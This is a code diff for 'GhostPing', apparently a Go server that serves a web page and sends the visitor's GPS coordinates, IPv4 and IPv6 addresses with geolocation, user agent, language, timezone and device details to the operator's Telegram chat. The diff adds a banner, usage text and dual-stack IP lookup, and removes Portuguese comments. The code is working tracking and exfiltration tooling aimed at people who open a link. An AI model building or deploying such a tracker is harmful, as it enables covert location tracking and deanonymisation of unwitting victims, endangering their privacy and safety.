@@ -41,8 +41,8 @@ type ClientData struct {
 type TelegramMessage struct {
 	ChatID                string `json:"chat_id"`
 	Text                  string `json:"text"`
-	ParseMode             string `json:"parse_mode,omitempty"`     // deixamos vazio
-	DisableWebPagePreview bool   `json:"disable_web_page_preview"` // evita preview gigante
+	ParseMode             string `json:"parse_mode,omitempty"`
+	DisableWebPagePreview bool   `json:"disable_web_page_preview"`
 }
 
 var (
@@ -64,26 +64,64 @@ func init() {
 }
 
 func usage() {
-	fmt.Println("GhostPing usage: ghostping -token <TOKEN> -chat <CHAT_ID> [-port 8088]")
+	ascii := `
+ @@@@@@@@  @@@  @@@   @@@@@@    @@@@@@   @@@@@@@  @@@@@@@   @@@  @@@  @@@   @@@@@@@@  
+@@@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@@  
+!@@        @@!  @@@  @@!  @@@  !@@         @@!    @@!  @@@  @@!  @@!@!@@@  !@@        
+!@!        !@!  @!@  !@!  @!@  !@!         !@!    !@!  @!@  !@!  !@!!@!@!  !@!        
+!@! @!@!@  @!@!@!@!  @!@  !@!  !!@@!!      @!!    @!@@!@!   !!@  @!@ !!@!  !@! @!@!@  
+!!! !!@!!  !!!@!!!!  !@!  !!!   !!@!!!     !!!    !!@!!!    !!!  !@!  !!!  !!! !!@!!  
+:!!   !!:  !!:  !!!  !!:  !!!       !:!    !!:    !!:       !!:  !!:  !!!  :!!   !!:  
+:!:   !::  :!:  !:!  :!:  !:!      !:!     :!:    :!:       :!:  :!:  !:!  :!:   !::  
+ ::: ::::  ::   :::  ::::: ::  :::: ::      ::     ::        ::   ::   ::   ::: ::::  
+ :: :: :    :   : :   : :  :   :: : :       :      :        :    ::    :    :: :: :  
+
+		 by k4rkarov (v1.0)`
+	fmt.Println("\033[32m" + ascii + "\033[0m")
+	fmt.Println(`
+Usage:
+  ghostping [options]
+
+Options:
+  -token TOKEN     Telegram bot token (required)
+  -chat CHAT_ID    Telegram chat ID (required)
+  -port PORT       Port to run the server (default: 8088)
+  -h, --help       Show this help message`)
 }
 
-func getIP(r *http.Request) string {
-	ip := r.Header.Get("X-Forwarded-For")
-	if ip == "" {
+func getIPs(r *http.Request) (string, string) {
+	ipHeader := r.Header.Get("X-Forwarded-For")
+	if ipHeader == "" {
 		host, _, err := net.SplitHostPort(r.RemoteAddr)
 		if err == nil {
-			ip = host
+			ipHeader = host
 		} else {
-			ip = r.RemoteAddr
+			ipHeader = r.RemoteAddr
 		}
 	}
-	if strings.Contains(ip, ",") {
-		ip = strings.Split(ip, ",")[0]
+
+	var ipv4, ipv6 string
+	ips := strings.Split(ipHeader, ",")
+	for _, candidate := range ips {
+		candidate = strings.TrimSpace(candidate)
+		parsed := net.ParseIP(candidate)
+		if parsed == nil {
+			continue
+		}
+		if parsed.To4() != nil && ipv4 == "" {
+			ipv4 = candidate
+		} else if parsed.To16() != nil && ipv6 == "" {
+			ipv6 = candidate
+		}
 	}
-	return strings.TrimSpace(ip)
+	return ipv4, ipv6
 }
 
 func enrichIP(ip string) (*IPInfo, error) {
+	if ip == "" {
+		return &IPInfo{}, nil
+	}
+
 	resp, err := httpCli.Get("http://ip-api.com/json/" + ip)
 	if err != nil {
 		return nil, err
@@ -120,7 +158,6 @@ func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// log do corpo bruto pra depurar JSON
 	body, _ := io.ReadAll(r.Body)
 	log.Println("RAW BODY:", string(body))
 	r.Body = io.NopCloser(bytes.NewBuffer(body))
@@ -132,14 +169,20 @@ func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	ip := getIP(r)
-	ipInfo, err := enrichIP(ip)
+	ipv4, ipv6 := getIPs(r)
+
+	ipv4Info, err := enrichIP(ipv4)
 	if err != nil {
-		log.Printf("Failed to enrich IP: %v", err)
-		ipInfo = &IPInfo{}
+		log.Printf("Failed to enrich IPv4: %v", err)
+		ipv4Info = &IPInfo{}
 	}
 
-	// link puro, sem Markdown
+	ipv6Info, err := enrichIP(ipv6)
+	if err != nil {
+		log.Printf("Failed to enrich IPv6: %v", err)
+		ipv6Info = &IPInfo{}
+	}
+
 	mapsURL := fmt.Sprintf("https://www.google.com/maps?q=%f,%f", data.Latitude, data.Longitude)
 
 	message := fmt.Sprintf(
@@ -148,7 +191,12 @@ Lat: %f
 Lon: %f
 
 🌐 Network
-IP: %s
+IPv4: %s
+City: %s
+Country: %s
+ISP: %s
+
+IPv6: %s
 City: %s
 Country: %s
 ISP: %s
@@ -170,10 +218,14 @@ Touch Points: %d
 
 🔗 Maps: %s`,
 		data.Latitude, data.Longitude,
-		ip,
-		emptyIf(ipInfo.City, "N/A"),
-		emptyIf(ipInfo.Country, "N/A"),
-		emptyIf(ipInfo.ISP, "N/A"),
+		emptyIf(ipv4, "N/A"),
+		emptyIf(ipv4Info.City, "N/A"),
+		emptyIf(ipv4Info.Country, "N/A"),
+		emptyIf(ipv4Info.ISP, "N/A"),
+		emptyIf(ipv6, "N/A"),
+		emptyIf(ipv6Info.City, "N/A"),
+		emptyIf(ipv6Info.Country, "N/A"),
+		emptyIf(ipv6Info.ISP, "N/A"),
 		data.UserAgent,
 		data.Language,
 		data.TimeZone,
@@ -194,7 +246,6 @@ Touch Points: %d
 		ChatID:                chatID,
 		Text:                  message,
 		DisableWebPagePreview: true,
-		// ParseMode vazio para não quebrar com caracteres especiais
 	}
 
 	if err := sendToTelegram(msg, botToken); err != nil {
@@ -234,7 +285,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	// servir /public
 	http.Handle("/", http.FileServer(http.Dir("public")))
 	http.HandleFunc("/send-location", sendLocationHandler)
 
